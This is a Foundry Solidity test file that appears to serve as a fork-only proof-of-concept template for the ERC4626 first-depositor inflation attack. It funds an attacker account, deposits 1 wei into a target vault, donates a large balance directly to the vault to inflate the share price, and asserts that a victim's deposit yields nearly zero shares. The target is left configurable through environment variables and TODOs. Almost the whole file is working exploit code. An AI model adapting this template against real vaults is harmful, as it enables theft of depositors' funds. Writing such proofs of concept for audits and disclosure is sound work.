// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- ERC4626 inflation / first-depositor attack
/// @notice A vault prices shares as totalAssets / totalSupply. The first
///         depositor deposits 1 wei (1 share), then DONATES a huge amount
///         directly to the vault. Share price explodes, so the NEXT
///         victim's deposit buys ~0 shares -- their funds are captured by
///         the first depositor.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. TODO: set ASSET / WHALE (a holder who can
///      fund the attacker) / adapt deposit() to the vault's real ABI.

interface IVault {
    function deposit(uint256 assets, address receiver) external returns (uint256 shares);
    function previewDeposit(uint256 assets) external view returns (uint256 shares);
    function asset() external view returns (address);
}

interface IERC20 {
    function balanceOf(address who) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract PoC is Test {
    address public target;
    uint256 public forkBlock;
    // TODO: an asset holder on this fork who can fund the attacker.
    address public constant WHALE = address(0);

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function test_exploit() public {
        require(WHALE != address(0), "set WHALE to an asset holder on this fork");

        address attackerEOA = makeAddr("attacker");
        address victimEOA = makeAddr("victim");
        address asset = IVault(target).asset();

        // Fund both from a whale.
        vm.prank(WHALE);
        IERC20(asset).transfer(attackerEOA, 2000 ether);
        vm.prank(WHALE);
        IERC20(asset).transfer(victimEOA, 1000 ether);

        // 1. Attacker deposits 1 wei -> 1 share (first depositor).
        vm.prank(attackerEOA);
        IERC20(asset).approve(target, 1);
        vm.prank(attackerEOA);
        IVault(target).deposit(1, attackerEOA);

        // 2. Attacker DONATES 1000 ether directly -- share price explodes.
        vm.prank(attackerEOA);
        IERC20(asset).transfer(target, 1000 ether);

        // 3. Victim deposits 1000 ether and gets ~0 shares.
        uint256 victimShares = IVault(target).previewDeposit(1000 ether);
        console.log("victim shares for 1000 ether deposit:", victimShares);
        assertLt(victimShares, 1000 ether / 100, "exploit did not reproduce: victim got a fair share amount");

    }
}
